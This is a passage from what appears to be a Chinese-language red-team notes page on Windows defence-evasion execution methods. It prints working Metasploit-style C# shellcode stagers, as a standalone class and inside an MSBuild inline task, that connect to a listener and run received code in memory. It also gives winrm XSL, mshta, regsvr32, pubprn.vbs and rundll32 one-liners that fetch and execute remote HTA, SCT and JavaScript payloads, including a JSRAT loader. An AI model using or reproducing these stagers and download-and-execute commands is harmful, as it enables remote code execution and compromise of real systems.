class=\"token class-name\">IntPtr</span> qPzVKjdiF<span class=\"token punctuation\">,</span><span class=\"token class-name\">UInt32</span> kNXJcS<span class=\"token punctuation\">,</span> <span class=\"token keyword\">ref</span> <span class=\"token class-name\">UInt32</span> atiLJcRPnhfyGvp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t\t\t <span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"kernel32\"</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\">UInt32</span> <span class=\"token function\">WaitForSingleObject</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">IntPtr</span> XSjyzoKzGmuIOcD<span class=\"token punctuation\">,</span> <span class=\"token class-name\">UInt32</span> VumUGj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> <span class=\"token function\">HMSjEXjuIzkkmo</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token keyword\">string</span></span> aCWWUttzmy<span class=\"token punctuation\">,</span><span class=\"token class-name\"><span class=\"token keyword\">int</span></span> iJGvqiEDGLhjr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t\t\t\t <span class=\"token class-name\">IPEndPoint</span> YUXVAnzAurxH <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token constructor-invocation class-name\">IPEndPoint</span><span class=\"token punctuation\">(</span>IPAddress<span class=\"token punctuation\">.</span><span class=\"token function\">Parse</span><span class=\"token punctuation\">(</span>aCWWUttzmy<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>iJGvqiEDGLhjr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\t\t\t <span class=\"token class-name\">Socket</span> MXCEuiuRIWgOYze <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token constructor-invocation class-name\">Socket</span><span class=\"token punctuation\">(</span>AddressFamily<span class=\"token punctuation\">.</span>InterNetwork<span class=\"token punctuation\">,</span> SocketType<span class=\"token punctuation\">.</span>Stream<span class=\"token punctuation\">,</span> ProtocolType<span class=\"token punctuation\">.</span>Tcp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\t\t\t <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span> MXCEuiuRIWgOYze<span class=\"token punctuation\">.</span><span class=\"token function\">Connect</span><span class=\"token punctuation\">(</span>YUXVAnzAurxH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t\t\t\t <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t\t\t\t <span class=\"token class-name\"><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> Bjpvhc <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token constructor-invocation class-name\"><span class=\"token keyword\">byte</span></span><span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t\t\t\t MXCEuiuRIWgOYze<span class=\"token punctuation\">.</span><span class=\"token function\">Receive</span><span class=\"token punctuation\">(</span>Bjpvhc<span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token class-name\"><span class=\"token keyword\">int</span></span> IETFBI <span class=\"token operator\">=</span> BitConverter<span class=\"token punctuation\">.</span><span class=\"token function\">ToInt32</span><span class=\"token punctuation\">(</span>Bjpvhc<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token class-name\"><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> ZKSAAFwxgSDnTW <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token constructor-invocation class-name\"><span class=\"token keyword\">byte</span></span><span class=\"token punctuation\">[</span>IETFBI <span class=\"token operator\">+</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token class-name\"><span class=\"token keyword\">int</span></span> JFPJLlk <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>JFPJLlk <span class=\"token operator\">&lt;</span> IETFBI<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#123;</span> JFPJLlk <span class=\"token operator\">+=</span> MXCEuiuRIWgOYze<span class=\"token punctuation\">.</span><span class=\"token function\">Receive</span><span class=\"token punctuation\">(</span>ZKSAAFwxgSDnTW<span class=\"token punctuation\">,</span> JFPJLlk <span class=\"token operator\">+</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>IETFBI <span class=\"token operator\">-</span> JFPJLlk<span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token number\">4096</span> <span class=\"token punctuation\">?</span> <span class=\"token punctuation\">(</span>IETFBI <span class=\"token operator\">-</span> JFPJLlk<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token number\">4096</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token class-name\"><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> nXRztzNVwPavq <span class=\"token operator\">=</span> BitConverter<span class=\"token punctuation\">.</span><span class=\"token function\">GetBytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>MXCEuiuRIWgOYze<span class=\"token punctuation\">.</span>Handle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>Array<span class=\"token punctuation\">.</span><span class=\"token function\">Copy</span><span class=\"token punctuation\">(</span>nXRztzNVwPavq<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> ZKSAAFwxgSDnTW<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> ZKSAAFwxgSDnTW<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">0xBF</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">return</span> ZKSAAFwxgSDnTW<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">TOdKEwPYRUgJly</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> KNCtlJWAmlqJ<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>KNCtlJWAmlqJ <span class=\"token operator\">!=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t<span class=\"token class-name\">UInt32</span> uuKxFZFwog <span class=\"token operator\">=</span> <span class=\"token function\">HeapCreate</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x00040000</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>UInt32<span class=\"token punctuation\">)</span>KNCtlJWAmlqJ<span class=\"token punctuation\">.</span>Length<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t<span class=\"token class-name\">UInt32</span> sDPjIMhJIOAlwn <span class=\"token operator\">=</span> <span class=\"token function\">HeapAlloc</span><span class=\"token punctuation\">(</span>uuKxFZFwog<span class=\"token punctuation\">,</span><span class=\"token number\">0x00000008</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>UInt32<span class=\"token punctuation\">)</span>KNCtlJWAmlqJ<span class=\"token punctuation\">.</span>Length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t<span class=\"token function\">RtlMoveMemory</span><span class=\"token punctuation\">(</span>sDPjIMhJIOAlwn<span class=\"token punctuation\">,</span> KNCtlJWAmlqJ<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>UInt32<span class=\"token punctuation\">)</span>KNCtlJWAmlqJ<span class=\"token punctuation\">.</span>Length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t<span class=\"token class-name\">UInt32</span> ijifOEfllRl <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token class-name\">IntPtr</span> ihXuoEirmz <span class=\"token operator\">=</span> <span class=\"token function\">CreateThread</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> sDPjIMhJIOAlwn<span class=\"token punctuation\">,</span> IntPtr<span class=\"token punctuation\">.</span>Zero<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">ref</span> ijifOEfllRl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t<span class=\"token function\">WaitForSingleObject</span><span class=\"token punctuation\">(</span>ihXuoEirmz<span class=\"token punctuation\">,</span><span class=\"token number\">0xFFFFFFFF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">QYJOTklTwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t<span class=\"token class-name\"><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> ZKSAAFwxgSDnTW <span class=\"token operator\">=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span> ZKSAAFwxgSDnTW <span class=\"token operator\">=</span> <span class=\"token function\">HMSjEXjuIzkkmo</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"192.168.0.107\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">12138</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t<span class=\"token function\">TOdKEwPYRUgJly</span><span class=\"token punctuation\">(</span>ZKSAAFwxgSDnTW<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"-282\"><a class=\"anchor\" href=\"#-282\">#</a> </h2>\n<h2 id=\"msbuild-2\"><a class=\"anchor\" href=\"#msbuild-2\">#</a> Msbuild</h2>\n<pre><code>https://gitee.com/RichChigga/msbuild-exec\nMSF监听\n&gt;C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe 1.xml\n</code></pre>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>Project</span> <span class=\"token attr-name\">ToolsVersion</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>4.0<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">xmlns</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://schemas.microsoft.com/developer/msbuild/2003<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>Target</span> <span class=\"token attr-name\">Name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>iJEKHyTEjyCU<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>xUokfh</span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>Target</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>UsingTask</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token attr-name\">TaskName</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>xUokfh<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token attr-name\">TaskFactory</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>CodeTaskFactory<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token attr-name\">AssemblyFile</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>Task</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>Code</span> <span class=\"token attr-name\">Type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Class<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">Language</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>cs<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token cdata\">&lt;![CDATA[</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices;</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>public class xUokfh : Task, ITask &#123;</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 ogephG,UInt32 fZZrvQ, UInt32 nDfrBaiPvDyeP, UInt32 LWITkrW);</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 qEVoJxknom, UInt32 gZyJBJWYQsnXkWe, UInt32 jyIPELfKQYEVZM,IntPtr adztSLHGJiurGO, UInt32 vjSCprCJ, ref UInt32 KbPukprMQXUp);</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr wVCIQGmqjONiM, UInt32 DFgVrE);</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>static byte[] VYcZlUehuq(string IJBRrBqhigjGAx, int XBUCexXIrGIEpe) &#123;</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>IPEndPoint DRHsPzS = new IPEndPoint(IPAddress.Parse(IJBRrBqhigjGAx),XBUCexXIrGIEpe);</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Socket zCoDOd = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>try &#123; zCoDOd.Connect(DRHsPzS); &#125;</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>catch &#123; return null;&#125;</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>byte[] OCrGofbbWRVsFEl = new byte[4];</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>zCoDOd.Receive(OCrGofbbWRVsFEl, 4, 0);</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>int auQJTjyxYw = BitConverter.ToInt32(OCrGofbbWRVsFEl, 0);</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>byte[] MlhacMDOKUAfvMX = new byte[auQJTjyxYw + 5];</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>int GFtbdD = 0;</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>while (GFtbdD &lt; auQJTjyxYw)</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>&#123; GFtbdD += zCoDOd.Receive(MlhacMDOKUAfvMX, GFtbdD + 5, (auQJTjyxYw -GFtbdD) &lt; 4096 ? (auQJTjyxYw - GFtbdD) : 4096, 0);&#125;</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>byte[] YqBRpsmDUT = BitConverter.GetBytes((int)zCoDOd.Handle);</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>Array.Copy(YqBRpsmDUT, 0, MlhacMDOKUAfvMX, 1, 4); MlhacMDOKUAfvMX[0]= 0xBF;</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>return MlhacMDOKUAfvMX;&#125;</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>static void NkoqFHncrcX(byte[] qLAvbAtan) &#123;</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>if (qLAvbAtan != null) &#123;</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>UInt32 jrYMBRkOAnqTqx = VirtualAlloc(0, (UInt32)qLAvbAtan.Length, 0x1000, 0x40);</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>Marshal.Copy(qLAvbAtan, 0, (IntPtr)(jrYMBRkOAnqTqx),qLAvbAtan.Length);</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>IntPtr WCUZoviZi = IntPtr.Zero;</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>UInt32 JhtJOypMKo = 0;</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>IntPtr UxebOmhhPw = IntPtr.Zero;</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>WCUZoviZi = CreateThread(0, 0, jrYMBRkOAnqTqx, UxebOmhhPw, 0, ref JhtJOypMKo);</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>WaitForSingleObject(WCUZoviZi, 0xFFFFFFFF); &#125;&#125;</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>public override bool Execute()</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>&#123;</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>byte[] uABVbNXmhr = null; uABVbNXmhr = VYcZlUehuq(\"192.168.0.107\",12138);</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>NkoqFHncrcX(uABVbNXmhr);</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>return true; &#125; &#125;</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>]]></span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>Code</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>Task</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>UsingTask</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>Project</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h2 id=\"-283\"><a class=\"anchor\" href=\"#-283\">#</a> </h2>\n<h2 id=\"winrm\"><a class=\"anchor\" href=\"#winrm\">#</a> Winrm</h2>\n<pre><code>MSF监听\n</code></pre>\n<p><img data-src=\"131.png\" alt=\"\" /></p>\n<pre><code>&gt;mkdir winrm\n&gt;copy c:\\Windows\\System32\\cscript.exe winrm\n创建文件WsmPty.xsl复制payload进去\n</code></pre>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version='1.0'?></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>stylesheet</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token attr-name\">xmlns</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://www.w3.org/1999/XSL/Transform<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>ms</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>urn:schemas-microsoft-com:xslt<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>user</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>placeholder<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token attr-name\">version</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>1.0<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>output</span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token namespace\">ms:</span>script</span> <span class=\"token attr-name\">implements-prefix</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>user<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">language</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>JScript<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> <span class=\"token cdata\">&lt;![CDATA[</pre></td></tr><tr><td data-num=\"9\"></td><td><pre> var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd\");</pre></td></tr><tr><td data-num=\"10\"></td><td><pre> ]]></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span><span class=\"token namespace\">ms:</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>stylesheet</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><img data-src=\"132.png\" alt=\"\" /></p>\n<pre><code>执行\n&gt;cscript.exe //nologo C:\\Windows\\System32\\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty\n</code></pre>\n<p><img data-src=\"133.png\" alt=\"\" /></p>\n<h2 id=\"-284\"><a class=\"anchor\" href=\"#-284\">#</a> </h2>\n<h2 id=\"mshta-2\"><a class=\"anchor\" href=\"#mshta-2\">#</a> Mshta</h2>\n<pre><code>&gt;use exploit/windows/misc/hta_server\n&gt;set srvhost 192.168.0.107\n&gt;mshta http://192.168.0.107:8080/RgNeCv.hta\n</code></pre>\n<p><img data-src=\"134.png\" alt=\"\" /></p>\n<pre><code>执行vb\n\t&gt;mshta vbscript:CreateObject(&quot;Wscript.Shell&quot;).Run(&quot;calc.exe&quot;,0,true)(window.close)\nJs\n\t&gt;mshta javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);&#125;\nJsrat\n\t&gt;mshta javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.2.101:9998/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);&#125;\n</code></pre>\n<h2 id=\"-285\"><a class=\"anchor\" href=\"#-285\">#</a> </h2>\n<h2 id=\"regsvr32\"><a class=\"anchor\" href=\"#regsvr32\">#</a> Regsvr32</h2>\n<pre><code>上线Empire\n&gt;usestager windows/launcher_sct\n生成sct文件放入web目录\n&gt;regsvr32 /s /n /u /i:http://192.168.0.107:8080/launcher.sct scrobj.dll\n&gt;cscript /b C:\\Windows\\System32\\Printing_Admin_Scripts\\zh-CN\\pubprn.vbs 127.0.0.1 script:http://192.168.0.107/test.sct\n</code></pre>\n<h2 id=\"-286\"><a class=\"anchor\" href=\"#-286\">#</a> </h2>\n<h2 id=\"rundll32\"><a class=\"anchor\" href=\"#rundll32\">#</a> Rundll32</h2>\n<h2 id=\"-287\"><a class=\"anchor\" href=\"#-287\">#</a> </h2>\n<h3 id=\"执行文件\"><a class=\"anchor\" href=\"#执行文件\">#</a> 执行文件</h3>\n<pre><code>&gt;rundll32 url.dll, OpenURL file://c:\\windows\\system32\\calc.exe\n&gt;rundll32 url.dll, OpenURLA file://c:\\windows\\system32\\calc.exe\n&gt;rundll32 url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e\n&gt;rundll32 url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e\n&gt;rundll32 url.dll, FileProtocolHandler calc.exe\n</code></pre>\n<h2 id=\"-288\"><a class=\"anchor\" href=\"#-288\">#</a> </h2>\n<h3 id=\"无弹窗执行\"><a class=\"anchor\" href=\"#无弹窗执行\">#</a> 无弹窗执行</h3>\n<pre><code>&gt;rundll32 javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;C:/Windows/System32/mshta.exe http://192.168.0.107:8080/SU8Fd6kNRz0.hta&quot;,0,true);self.close();\n</code></pre>\n<h2 id=\"-289\"><a class=\"anchor\" href=\"#-289\">#</a> </h2>\n<h3 id=\"增删注册表\"><a class=\"anchor\" 